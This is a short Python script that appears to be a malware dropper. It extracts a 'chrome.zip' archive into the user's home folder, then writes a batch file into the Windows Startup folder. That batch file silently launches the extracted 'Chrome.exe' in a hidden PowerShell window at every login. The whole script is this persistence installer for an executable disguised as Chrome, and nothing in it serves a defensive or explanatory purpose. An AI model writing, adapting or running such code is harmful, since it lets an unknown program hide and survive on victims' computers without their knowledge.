import os 
from time import sleep
from zipfile import ZipFile
import getpass


user = getpass.getuser()

with ZipFile('chrome.zip', 'r') as zipObj:
   zipObj.extractall(f"/Users/{user}")

pat = f'powershell Start-Process -WindowStyle hidden -FilePath C:\\Users\\{user}\\chrome\\Chrome.exe'

dire = f'/Users/{user}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/Chrome.bat'

file = open(dire, "w")
file.write(pat)
file.close()